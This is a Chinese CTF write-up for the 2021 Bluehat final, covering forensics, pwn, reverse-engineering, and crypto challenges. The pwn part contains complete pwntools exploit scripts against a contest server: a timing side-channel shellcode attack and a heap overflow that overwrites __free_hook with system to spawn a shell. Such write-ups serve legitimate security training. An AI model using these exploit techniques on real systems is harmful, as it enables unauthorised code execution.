zhangsan.001 和 zhangsan.ad1.txt 两个文件\nwinhex挂载 zhangsan.001，在分区1的 $RECYCLE.BIN 中找到 tips.txt.txt 文件，内容为\nIn order to prevent leaving evidence, Zhang San deleted all the key evidence photos. 因此寻找 png 文件，同样在分区1的 $RECYCLE.BIN 中找到了包含相应的 flag 图片 $REFK9A1.png\nPwn secretcode 掏出初赛的代码稍微改改\nfrom pwn import * import sys # context.log_level = \u0026#34;debug\u0026#34; context.arch = \u0026#39;amd64\u0026#39; if len(sys.argv) \u0026lt; 2: debug = True else: debug = False ru = lambda x : p.recvuntil(x) sn = lambda x : p.send(x) rl = lambda : p.recvline() sl = lambda x : p.sendline(x) rv = lambda x : p.recv(x) sa = lambda a,b : p.sendafter(a,b) sla = lambda a,b : p.sendlineafter(a, b) def debugf(b=0): if debug: if b: gdb.attach(p,\u0026#34;b *$rebase({b})\u0026#34;.format(b = hex(b))) else: gdb.attach(p) def pwn(p, index, ch): # open shellcode = \u0026#34;push 0x1003caaa; pop rdi; shr edi, 12; xor esi, esi; push 2; pop rax; syscall;\u0026#34; # re open, rax =\u0026gt; 4 shellcode += \u0026#34;and ecx,0x15;inc ecx;\u0026#34; shellcode += \u0026#34;s:push 2; pop rax; push rcx;syscall; pop rcx;loop s;\u0026#34; # read(rax, 0x10040, 0x50) shellcode += \u0026#34;mov rdi, rax; xor eax, eax; push 0x50; pop rdx; push 0x10040aaa; pop rsi; shr esi, 12; syscall;\u0026#34; # cmp and jz if index == 0: shellcode += \u0026#34;cmp byte ptr[rsi+{0}], {1}; jz $-3; ret\u0026#34;.format(index, ch) else: shellcode += \u0026#34;cmp byte ptr[rsi+{0}], {1}; jz $-4; ret\u0026#34;.format(index, ch) shellcode = asm(shellcode) pay = shellcode.ljust(0x40 - 4, b\u0026#39;a\u0026#39;) + b\u0026#39;flag\u0026#39; log.warning(hex(len(pay))) p.sendafter(\u0026#34;==\\n\u0026#34;, pay) index = 0 ans = [] while True: for ch in range(0x20, 127): try: if debug: p = process(\u0026#34;./chall\u0026#34;) else: p = remote(\u0026#39;47.104.169.149\u0026#39;, 25178) pwn(p, index, ch) start = time.time() p.recv(timeout=2) except: pass end = time.time() p.close() if end - start \u0026gt; 1.5: ans.append(ch) print(\u0026#34;\u0026#34;.join([chr(i) for i in ans])) break else: print(\u0026#34;\u0026#34;.join([chr(i) for i in ans])) break index = index + 1 print(ans) print(\u0026#34;\u0026#34;.join([chr(i) for i in ans])) p.interactive() babynote abs32的洞，直接上下无限堆溢出\nfrom pwn import * import sys context.log_level = \u0026#34;debug\u0026#34; if len(sys.argv) \u0026lt; 2: debug = True else: debug = False if debug: p = process(\u0026#34;./chall\u0026#34;) libc = ELF(\u0026#34;/home/daidaishou/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc.so.6\u0026#34;) else: p = remote(\u0026#34;47.104.169.149\u0026#34;,\u0026#34;14269\u0026#34;) libc = ELF(\u0026#34;./libc-2.27.so\u0026#34;) ru = lambda x : p.recvuntil(x) sn = lambda x : p.send(x) rl = lambda : p.recvline() sl = lambda x : p.sendline(x) rv = lambda x : p.recv(x) sa = lambda a,b : p.sendafter(a,b) sla = lambda a,b : p.sendlineafter(a, b) def debugf(b=0): if debug: if b: gdb.attach(p,\u0026#34;b *$rebase({b})\u0026#34;.format(b = hex(b))) else: gdb.attach(p) def menu(i): sla(\u0026#39;\u0026gt; \u0026#39;, str(i)) def add(sz, c): menu(1) sla(\u0026#39;size\u0026gt; \u0026#39;, str(sz)) sa(\u0026#39;msg\u0026gt; \u0026#39;, c) def free(i): menu(3) sla(\u0026#39;idx\u0026gt; \u0026#39;, str(i)) def edit(i, offset, c): menu(2) sla(\u0026#39;idx\u0026gt; \u0026#39;, str(i)) sla(\u0026#39;offset\u0026gt; \u0026#39;, str(offset)) sa(\u0026#39;msg\u0026gt; \u0026#39;, c) def show(i): menu(4) sla(\u0026#39;idx\u0026gt; \u0026#39;, str(i)) debugf() add(0x29c, b\u0026#39;Chunk_0\\n\u0026#39;) add(0x200, b\u0026#39;Chunk_1\\n\u0026#39;) add(0x78, b\u0026#39;Chunk_2\\n\u0026#39;) add(0x21f, b\u0026#39;Chunk_3\\n\u0026#39;) add(0x18, b\u0026#39;/bin/sh\\n\u0026#39;) edit(0, 0x80000000, b\u0026#39;\\x07\u0026#39;*0x5e + b\u0026#39;\\n\u0026#39;) free(1) edit(3, 0x80000000, b\u0026#39;a\u0026#39;*0x52 + p64(0x80+0x210) + p64(0x230) + b\u0026#39;\\n\u0026#39;) free(3) add(0x200, \u0026#39;Chunk_1\\n\u0026#39;) show(2) libc.address = u64(rv(6) + b\u0026#39;\\x00\u0026#39;*2) - 0x3ebca0 log.warning(hex(libc.address)) free_hook = libc.sym[\u0026#39;__free_hook\u0026#39;] edit(0, 0x80000000, b\u0026#39;\\x01\u0026#39;*(12+0x80)+p64(free_hook)*0x60 + b\u0026#39;\\n\u0026#39;) add(0xd8, p64(libc.sym[\u0026#39;system\u0026#39;]) + b\u0026#39;\\n\u0026#39;) free(4) p.interactive() Re abc 动调，发现输入主要是进入一个case语句\n__int64 __fastcall sub_401406() { char *v0; // rax  int v1; // ecx  v1 = *v0; switch ( v1 ) { case \u0026#39;#\u0026#39;: // 右  return sub_400A65(); case \u0026#39;$\u0026#39;: // 上  return sub_40085B(); case \u0026#39;%\u0026#39;: // 左  return sub_400B6D(); case \u0026#39;@\u0026#39;: // 下  return sub_40095D(); } sub_4013EE(); return sub_400C6F(); } 分别查看四个函数，发现主要是将内存中的-1与另一个数据进行交换\n最后的验证逻辑为\nv10 = __ROR4__(__ROL4__(0x75DFBD5B, 15) ^ 0xDEADBEEF, 10);// 1  for ( i = v10; i \u0026lt; 15; i = i - 84 + 85 ) { sub_400CBA(); if ( box[i] - box[i - 1] != 1 ) v10 = __ROR4__(__ROL4__(0x7DDFBD5B, 15) ^ 0xDEADBEEF, 10); } 内存中总共有16个数字，猜测是一个十六格的拼图\n1, A, 2, 3, 5, D, 6, 4, 9,-1, 7, B, E, F, C, 8 其中-1可以上下左右交换位置\n手动解一下，远程验证\n$$##@@%%$##@@%$$#@%%%@#$%@##$%%@##$%@#$#@ executable_pyc 工具还原字节码，根据字节码手动恢复出python脚本，得到加密逻辑\ndef e2(m): assert type(m) == bytes l = len(m) // 2 m1 = s2n(m[:l]) m2 = s2n(m[l:]) p = gen_prime(1024) q = gen_prime(1024) pp = g.next_prime(p + 2333) qq = g.next_prime(q + 2333) e = g.next_prime(65535) ee = g.next_prime(e) n = p * q nn = pp * qq c1 = n2s(pow(m1, e, n)) c2 = n2s(pow(m2, ee, nn)) print (str(n), nn.digits(), (c1 + c2).hex()) 后面就是解密码题了，需要找出p和q\n因为素数的频率大概在​ $\\ln(n)$ 的时间复杂度，所以​ $pp$ 和 $p$ ​以及 $qq$ ​和 $q$ ​的差距很小，大概在 $​p+2333+\\ln(p)$ 附近。\n所以让 $pp=p+x, qq=q+y$​。有 $n=pq, nn=pp*qq=(p+x)(q+x)=n+py+qx+xy$\n让 $dn=nn-n=py+qx+xy=py+xn/p+xy$​，有 $yp^2+(xy-dn)p+xn=0​$\n如果让 $​p$ 有解，则让 $\\Delta=(xy-dn)^2-4xyn=x^2y^2-2\\cdot dn\\cdot xy+(dn)^2-4xyn\u0026gt;0$ ​且能够保证 $\\Delta$​开出整数方根。函数如下\ndef qiugen(x, y, dn): cur = x ** 2 * y ** 2 + dn ** 2 - 2 * dn * x * y - 4 * x * y * n cur_root = root(cur, 2) if cur_root ** 2 == cur: up = dn - x * y + cur_root if up % (2 * y) == 0: ans = up // (2 * y) return ans return -1 然后开始遍历​x,y，考虑到素数频率，可以大致确定x,y范围为[2333, 2333+1024]​。将其范围扩展到[2333, 4333]​。这样遍历的范围在4000000次qiugen函数运算。\n考虑到​nn确定，所以​x,y之间应该满足某种条件。​\n$\\Delta=x^2y^2-2dn\\cdot xy+(dn)^2-4xyn=h^2-(2dn+4n)h+(dn)^2$，其中$h=xy$​。如果需要让​$\\Delta\u0026gt;0$，需要$h\u0026lt;dn+2n-2*sqrt(dn\\cdot n+n^2)$，约为6174696​。\n所以可以令x遍历[2333,4333]，令y遍历[2333,6174696/x]​，即可找到真正的​x,y。即可得到p,q,pp,qq​。\nfrom Qmath import root from libnum import * from gmpy2 import next_prime ​ n = 10300808326934539089496666241808264289631957459372648156286399524715435483257526083909012656240599916663153630994400397551123967736269088895097145175999170121832669199408651009327424481969614347720526807144751032787049942449153321489493089722581323461987069958785112077070200328522919094221696573840593056153329019331663146921270200309620591339456771948171473174493228003768777355758929283942611167959313149646888081882056633536206394514157657102927145569575772516981907153659054180860331268989018643271316833183194539111739812416472551511615664022982639779869597584768094658974144703654232643726744397158318139843 nn = 10300808326934539089496666241808264289631957459372648156286399524715435483257526083909012656240599916663153630994400397551123967736269088895097145175999170121832669199408651009327424481969614347720526807144751032787049942449153321489493089722581323461987069958785112077070200328522919094221696573840593061197309859493502461339998035893727381543475878482841368750058482267744297318087515308976122481608145274938058888809506400916026737269420025654685431401793700398817215185170304169141953786566489760847593258253794575454082327627379713144072687287826518630644255675609067675836382036436064703619178779628644141463 cipher = 0x22cca5150ca0bb2132f68302dc7441e52b91ae7252e44cc13ed83e58253a9aaaa55e095ba36748dff7ea21fff553f8c4656e77a508b64da054f1381b7e2d0600bcec6ed9e1cc8d14c2362aaef7a972a714f88e5afb2d39ed77d0c22a449ca2cfb0802c138f20e0ecbd3c174151cdb8e8ca6d89aa3c503615ebfbc851af5ac51dcfa8b5869b775b57a27b9e4346979180d89b303cae2c5d9e6cabb3c9947837bd8f92333532d4b54dd72ea35400060006328f6f4329147df195ec78a7ab9d39973ce0fd6511e7a0de54737bee64476ba531604f0375b08adf7d768c41ba9e2ba88468d126561a134de79dc0217c1c56d219ca6747103618e46f35281feb9e6050c93e32e26e21ee2c3495f60db2fad9f9a5c570c9f97aee698024ebff6163ef26e32958872db7c593d7f41f90981b8db45aa01085be1e61f7603ecf3d5c032dd90dea791cd9825299548c0cbe7dadabc157048a7fd5cd4bcb1cfeaf0bd2d679f66cb0b1c33ec04bd20317f872c85d500a3475833f983fdee59b3f61a731e2a8b9a60bd7d840f46e97f06dd4fd8ad1cb4d13a82da01938801c33835ceaf34e1cf62ebdde7ac68b17c2a236b64ffacd2a0e7258571ce570871aea9f309df63c0a3abcfa0c05d159a82f9fa3f3ad73944e4ae33c3432c8b65c0d6fe9b560220b14abe5886188fc1e6afa4bb4395669618387224422acf20b519af902225e270 ​ dn = nn - n ​ def qiugen(x, y, dn): cur = x ** 2 * y ** 2 + dn ** 2 - 2 * dn * x * y - 4 * x * y * n cur_root = root(cur, 2) if cur_root ** 2 == cur: up = dn - x * y + cur_root if up % (2 * y) == 0: ans = up // (2 * y) return ans return -1 ​ ​ for x in range(4333, 2333, -1): if (x - 2333) % 100 == 0: print x for y in range(6174700 // x, 2332, -1): cur_ans = qiugen(x, y, dn) if cur_ans != -1: print cur_ans if n % cur_ans == 0: p = cur_ans q = n // p print cur_ans pp = next_prime(p + 2333) qq = next_prime(q + 2333) print (n2s(pow(c1, invmod(0x10001, (p - 1) * (q - 1)), p * q))) print (n2s(pow(c2, invmod(0x10003, (pp - 1) * (qq - 1)), pp * qq))) Crypto crack point 已知椭圆曲线正常加密，key的位数过小，大步小步法爆破2的39次方到2的40次方寻找key=436370150383，算出\npoint2 = (54874480268135442592960451774606422130 : 54593336491331150503709607435043296744 : 1)\nflag = cipher - point_2得到最终点\n","date":"2021-11-05T16:23:41+08:00","permalink":"https://or4ngesec.github.io/post/bluehat-final-writeup/","title":"2021蓝帽杯决赛 Writeup"}]